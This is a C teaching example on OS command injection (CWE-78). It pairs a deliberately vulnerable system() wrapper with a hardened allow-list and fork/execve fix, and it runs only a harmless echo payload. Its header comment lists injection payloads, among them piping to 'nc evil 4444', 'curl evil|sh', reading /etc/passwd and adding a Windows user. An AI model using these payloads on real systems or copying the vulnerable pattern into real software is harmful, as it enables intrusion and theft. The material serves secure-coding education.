/*
 * ex07_command_injection.c - OS command injection (CWE-78)
 * ==========================================================================
 *
 * 1. WHAT IS IT?
 * --------------
 * The program builds a command LINE (a single string) out of fixed text plus
 * data that an attacker can influence, and hands that string to a command
 * interpreter via system(), popen(), _popen(), ShellExecute, or
 * `cmd /c ...`:
 *
 *      snprintf(cmd, sizeof cmd, "ping -c1 %s", host);   // host = user input
 *      system(cmd);                                      // sh -c "<cmd>"
 *
 * system() does not run "ping". It runs the SHELL (/bin/sh -c on POSIX,
 * cmd.exe /c on Windows), and the shell re-parses the whole string. Anything
 * the shell treats as syntax rather than data lets the attacker add or
 * replace commands. The core bug is mixing CODE (the command) and DATA (the
 * host name) in one string - the same root cause as SQL injection.
 *
 * Shell metacharacters that change meaning:
 *   POSIX sh : ;  |  &  &&  ||  `cmd`  $(cmd)  newline  >  <  *  ?  [ ]
 *              $VAR  ${VAR}  ~  quotes and backslash
 *   cmd.exe  : &  &&  |  ||  ^  %VAR%  "  <  >  newline, plus the quirk that
 *              cmd.exe applies its own parsing rules on top of the program's
 *              argument parsing rules (see "BatBadBut" below).
 *
 * Related flavours of the same family of bugs:
 *  - Untrusted PATH / relative program names: system("ping ...") or
 *    execvp("ping", ...) searches PATH (and on Windows, the current
 *    directory and the application directory first). An attacker who
 *    controls PATH or can drop a file in the search path gets their own
 *    "ping" executed (CWE-426 untrusted search path, CWE-427).
 *  - Argument (option) injection (CWE-88): even WITHOUT a shell, if user
 *    input becomes an argv element starting with '-', the called program
 *    parses it as an option. E.g. a "file lookup" wrapper such as
 *    execv("/usr/bin/grep", {"grep", pattern, file}) with
 *    pattern = "--file=/etc/shadow", or `tar`, `curl`, `git`, `ssh`
 *    (`-oProxyCommand=...` runs commands!), `find -exec`, `sendmail -X`.
 *    The `--` terminator ("end of options") and validation prevent it.
 *  - Environment variables: the shell and many programs trust IFS, PATH,
 *    LD_PRELOAD, LD_LIBRARY_PATH, BASH_ENV, ENV, SHELLOPTS, PS4,
 *    exported bash functions ("Shellshock"), etc. A privileged program that
 *    calls system() inherits the attacker's environment (CERT ENV33-C,
 *    ENV03-C, CWE-454).
 *
 * 2. HOW IS IT EXPLOITED?
 * -----------------------
 * Suppose a web-admin CGI, a router firmware, a setuid helper or a Windows
 * service offers "ping a host" and builds "ping -c 1 <host>".
 *
 *   POSIX sh payloads for <host>:
 *     127.0.0.1; id                  - second command after ;
 *     127.0.0.1 && cat /etc/passwd   - runs if ping succeeds
 *     127.0.0.1 | nc evil 4444       - pipe into attacker's tool
 *     $(id)   or   `id`              - command substitution: the output of
 *                                      id becomes part of the command line,
 *                                      works even inside double quotes
 *     127.0.0.1%0Aid                 - a newline (URL-decoded) separates
 *                                      commands
 *     x > /var/www/html/shell.php    - redirection writes attacker files
 *
 *   Windows cmd.exe payloads for <host>:
 *     127.0.0.1 & whoami
 *     127.0.0.1 && net user hacker Passw0rd! /add
 *     127.0.0.1 | type C:\secret.txt
 *     "  & calc & "                  - break out of a quoted argument
 *     %COMSPEC% / ^& escaping tricks to bypass naive blacklists
 *
 * Impact: arbitrary command execution with the privileges of the process.
 * If the program is setuid root, runs as SYSTEM / a service account, or is
 * a network daemon, this is local privilege escalation or remote code
 * execution. Many router, IoT and appliance RCEs (and real CVEs) are exactly
 * this bug.
 *
 * Argument injection example (no shell involved): a "show file" helper runs
 *     execv("/usr/bin/zip", {"zip", "out.zip", userfile, NULL})
 * and the attacker passes userfile = "-TmTT=$(id>/tmp/x)" or similar,
 * turning data into an option.
 *
 * Blacklists ("remove ; | &") do NOT work: there are too many metacharacters,
 * encodings, newlines, shell-specific syntax, and cmd.exe quirks. Use an
 * ALLOW-list and avoid the shell.
 *
 * 3. HOW TO AVOID IT
 * ------------------
 *  a) Do not use a shell. Pass a vector of arguments, not a string.
 *     POSIX:   fork() + execve()/execv() (or posix_spawn()) with an argv
 *              array; each argv element is delivered verbatim as one
 *              argument, nothing is re-parsed. Wait with waitpid().
 *              Do NOT use system(), popen(), or "sh -c" with a built string.
 *     Windows: CreateProcess with an explicit lpApplicationName (full path)
 *              and a correctly quoted lpCommandLine, or _spawnv. Beware:
 *              Windows passes ONE command line string to the child, and the
 *              child splits it itself (CommandLineToArgvW / the C runtime),
 *              so YOU must quote each argument per those rules (double
 *              the backslashes before a quote, escape quotes, etc.).
 *              Never run .bat/.cmd files with untrusted arguments:
 *              cmd.exe re-parses the line with its own, different rules.
 *              This is CVE-2024-24576 ("BatBadBut", Rust's std::process
 *              and many other languages' runtimes): even a properly quoted
 *              argument could break out because of cmd.exe's % expansion
 *              and quote handling. Also note: starting a program with
 *              lpApplicationName = NULL makes Windows search for the
 *              executable and parse spaces in the path ("C:\Program Files\x"
 *              runs C:\Program.exe - CWE-428 unquoted search path).
 *              Built-ins such as echo, dir, copy are cmd.exe features, not
 *              programs - prefer APIs (CopyFileW, FindFirstFileW) instead.
 *  b) Validate input with an ALLOW-list (CERT STR02-C: sanitize data passed
 *     to complex subsystems). Define exactly what a valid value looks like -
 *     for an IP/host name: digits, letters, '.', ':' (IPv6), '-' - limit the
 *     length, and reject everything else (do not try to "escape" or
 *     "strip"). Reject a leading '-' so the value can never be read as an
 *     option.
 *  c) Terminate options with `--` when the target program supports it
 *     (argv = {"grep", "-e", pattern, "--", file, NULL}), or use an
 *     explicit form that binds the value ("--name=value" built by you).
 *  d) Use absolute program paths ("/bin/ping", not "ping") so PATH lookup
 *     cannot be hijacked; on Windows give the full path
 *     (GetSystemDirectoryW + "\\ping.exe") and never search the current
 *     directory.
 *  e) Pass a clean, minimal environment (execve with your own envp) instead
 *     of inheriting the caller's: sets PATH, IFS, LD_* etc. under your
 *     control (CERT ENV03-C, ENV33-C).
 *  f) Drop privileges before spawning (setuid/setgid helpers must not
 *     spawn at all if avoidable); run children with the least privilege,
 *     close inherited file descriptors (O_CLOEXEC / bInheritHandles=FALSE).
 *  g) Prefer library APIs over spawning tools: getaddrinfo() instead of
 *     "nslookup", opendir()/readdir() instead of "ls", zlib instead of
 *     "gzip", libcurl instead of "curl", CopyFileW instead of "copy".
 *  h) Defence in depth: seccomp-bpf / pledge / unveil / Landlock / AppArmor
 *     on Linux, job objects / restricted tokens / AppContainer on Windows,
 *     containers - so that if an injection happens the blast radius is
 *     small.
 *
 * 4. BEST PRACTICES AND REFERENCES
 * --------------------------------
 *  - Keep data and code separate: argv arrays, never concatenated strings.
 *  - Allow-list validate at the trust boundary; validate again at the sink.
 *  - Treat every environment variable, file name, network field and
 *    command-line argument as untrusted.
 *  - Compile with -Wformat-security, use static analysis (CodeQL
 *    "cpp/command-line-injection", Coverity TAINTED_STRING, clang-tidy
 *    cert-env33-c which flags every system() call).
 *  - CWE-78  Improper Neutralization of Special Elements used in an OS
 *            Command ('OS Command Injection')
 *  - CWE-77  Command Injection (parent class)
 *  - CWE-88  Argument Injection or Modification
 *  - CWE-426 Untrusted Search Path / CWE-427 Uncontrolled Search Path
 *  - CWE-428 Unquoted Search Path or Element
 *  - CWE-454 External Initialization of Trusted Variables (environment)
 *  - CWE-20  Improper Input Validation
 *  - CERT C: ENV33-C (do not call system()), STR02-C, ENV03-C, ENV02-C,
 *    POS37-C (ensure privilege relinquishment), FIO22-C
 *  - OWASP: "OS Command Injection Defense Cheat Sheet", OWASP Top 10
 *    A03:2021 Injection
 *  - CVE-2024-24576 (BatBadBut), CVE-2014-6271 (Shellshock)
 *
 * THIS DEMO
 * ---------
 * The "tool" we wrap is the harmless `echo` (POSIX echo; on Windows
 * `cmd /c echo`). The vulnerable function builds "echo Pinging <host>" and
 * calls system(). In exploit mode the injected second command is just
 * another echo that prints INJECTED-COMMAND-RAN, so you can see the shell
 * executed attacker-chosen text as a command. Nothing destructive is run.
 * The fixed version validates with an allow-list and runs the program
 * without any shell (fork + execve with a clean environment on POSIX,
 * _spawnvp on Windows).
 */

#ifndef _WIN32
#define _POSIX_C_SOURCE 200809L
#endif

#include <ctype.h>
#include <errno.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "cvulns.h"

#ifdef _WIN32
#include <process.h>   /* _spawnvp, _P_WAIT */
#else
#include <sys/types.h>
#include <sys/wait.h>  /* waitpid */
#include <unistd.h>    /* fork, execve, _exit */
#endif

/* Harmless "injected" second command, platform specific. */
#ifdef _WIN32
#define BENIGN_HOST   "127.0.0.1"
#define MALICIOUS_HOST "127.0.0.1 & echo INJECTED-COMMAND-RAN"
#define ARGINJ_HOST   "-n"
#else
#define BENIGN_HOST   "127.0.0.1"
#define MALICIOUS_HOST "127.0.0.1; echo INJECTED-COMMAND-RAN"
#define ARGINJ_HOST   "-n"
#endif

/* ------------------------------------------------------------------------
 * VULNERABLE: build a command line and let the shell parse it.
 * ---------------------------------------------------------------------- */
static int ping_vulnerable(const char *host) {
    char cmd[256];

    /* BUG (CWE-78): `host` is attacker-controlled and is pasted into a
     * string that a shell will parse. Any metacharacter in `host`
     * (; & | ` $( ) newline ...) becomes shell syntax. snprintf() does
     * prevent a buffer overflow here, but it does nothing about injection:
     * memory safety and injection safety are different problems. */
    int n = snprintf(cmd, sizeof cmd, "echo Pinging %s", host);
    if (n < 0 || (size_t)n >= sizeof cmd) {
        BAD("command line too long");
        return -1;
    }

    INFO("executing via shell: system(\"%s\")", cmd);
    fflush(stdout);              /* so our output is ordered before the child's */

    /* BUG: system() runs /bin/sh -c (POSIX) or cmd.exe /c (Windows) on the
     * whole string. It also inherits our environment and searches PATH. */
    int rc = system(cmd);
    fflush(stdout);
    return rc;
}

/* ------------------------------------------------------------------------
 * FIXED part 1: strict allow-list validation of the host argument.
 *
 * Accepts: ASCII letters, digits, '.', '-', '_' (host names, IPv4) and ':'
 * (IPv6 hex groups). Length 1..253 (max DNS name). The first character must
 * not be '-', so the value can never be mistaken for an option. Everything
 * else - space, ; & | ` $ ( ) < > " ' \ % ^ newline, non-ASCII - is
 * rejected. We do not try to escape or clean the input; we refuse it.
 * We test explicit ASCII ranges instead of isalnum() so the result does not
 * depend on the current locale.
 * ---------------------------------------------------------------------- */
static int host_is_valid(const char *s) {
    size_t len = 0;

    if (s == NULL || s[0] == '\0' || s[0] == '-')
        return 0;
    for (; s[len] != '\0'; len++) {
        unsigned char c = (unsigned char)s[len];
        int ok = (c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') ||
                 (c >= '0' && c <= '9') ||
                 c == '.' || c == '-' || c == '_' || c == ':';
        if (!ok || len >= 253)
            return 0;
    }
    return 1;
}

/* ------------------------------------------------------------------------
 * FIXED part 2: run the program WITHOUT a shell.
 * Returns the child's exit status, or -1 on failure.
 * ---------------------------------------------------------------------- */
#ifdef _WIN32
/* Windows: `echo` is a cmd.exe built-in, so the only way to run it is
 * through cmd.exe. That means cmd.exe's parser still sees the arguments,
 * and _spawnvp does NOT quote or escape them (it just joins them with
 * spaces). Here the argument has already passed host_is_valid(), which is
 * what makes this safe: no space, quote, & | ^ % < > can be present. For a
 * real external program you would use its full path and, when arguments
 * may contain spaces or quotes, build lpCommandLine with correct quoting
 * and call CreateProcessW with lpApplicationName set. Never route
 * untrusted data through a .bat/.cmd file (BatBadBut, CVE-2024-24576). */
static int run_no_shell(const char *host) {
    const char *argv[] = { "cmd.exe", "/c", "echo", "Pinging", NULL, NULL };
    argv[4] = host;
    fflush(stdout);
    intptr_t rc = _spawnvp(_P_WAIT, "cmd.exe", argv);
    fflush(stdout);
    return (int)rc;
}
#else
/* POSIX: fork + execve with an argv ARRAY. Each element reaches the child
 * verbatim as a single argument; no parser ever looks at it. The program is
 * an absolute path (no PATH search) and the environment is empty (nothing
 * inherited from the caller). */
static int run_no_shell(const char *host) {
    char *const argv[] = { (char *)"echo", (char *)"Pinging", (char *)host, NULL };
    char *const envp[] = { NULL };    /* clean environment */
    int status = 0;
    pid_t pid;

    fflush(stdout);                   /* otherwise buffered output is
                                         duplicated/misordered by fork() */
    pid = fork();
    if (pid < 0) {
        BAD("fork failed: %s", strerror(errno));
        return -1;
    }
    if (pid == 0) {
        execve("/bin/echo", argv, envp);
        _exit(127);                   /* only reached if execve failed;
                                         _exit avoids running parent's
                                         atexit handlers / flushing buffers */
    }
    while (waitpid(pid, &status, 0) < 0) {
        if (errno != EINTR) {
            BAD("waitpid failed: %s", strerror(errno));
            return -1;
        }
    }
    return WIFEXITED(status) ? WEXITSTATUS(status) : -1;
}
#endif

/* FIXED: validate, then execute without a shell. */
static int ping_fixed(const char *host) {
    if (!host_is_valid(host)) {
        GOOD("REJECTED by allow-list validator: \"%s\"", host);
        return -1;
    }
    INFO("host \"%s\" passed validation; executing without a shell", host);
    return run_no_shell(host);
}

/* ------------------------------------------------------------------------
 * Demo driver
 * ---------------------------------------------------------------------- */
static int run(vuln_mode mode) {
    switch (mode) {
    case MODE_VULN:
        SECTION("vulnerable code, benign input");
        INFO("host = \"%s\"", BENIGN_HOST);
        ping_vulnerable(BENIGN_HOST);
        INFO("works as intended when input is well-formed.");
        break;

    case MODE_EXPLOIT:
        SECTION("vulnerable code, malicious input");
        INFO("host = \"%s\"", MALICIOUS_HOST);
        INFO("the attacker appended a second command to the host name.");
        ping_vulnerable(MALICIOUS_HOST);
        BAD("if you see INJECTED-COMMAND-RAN on a line of its own above, the shell");
        BAD("executed attacker-supplied text as a command (CWE-78).");
        BAD("a real payload (id, whoami, curl evil|sh) would run with OUR privileges.");
        break;

    case MODE_FIXED:
        SECTION("hardened code, malicious input");
        INFO("host = \"%s\"", MALICIOUS_HOST);
        ping_fixed(MALICIOUS_HOST);

        INFO("argument-injection attempt: host = \"%s\" (looks like an option)", ARGINJ_HOST);
        ping_fixed(ARGINJ_HOST);

        INFO("benign input still works:");
        ping_fixed(BENIGN_HOST);

#ifndef _WIN32
        /* Defence in depth: even if validation were missing or buggy, the
         * absence of a shell means the payload is a single literal argument
         * and is merely printed, never executed. (Not demonstrated on
         * Windows: cmd.exe /c echo would re-parse the text, which is exactly
         * why validation is mandatory there.) */
        INFO("defence in depth: skip validation, still no shell:");
        run_no_shell(MALICIOUS_HOST);
        GOOD("the payload was printed literally as one argument; no second command ran.");
#else
        GOOD("on Windows the validator is the primary control; also prefer APIs over cmd.exe.");
#endif
        break;
    }
    fflush(stdout);
    return 0;
}

const vuln_example ex07_example = {
    "command-injection",
    "OS command injection via system()/popen() (CWE-78)",
    run
};
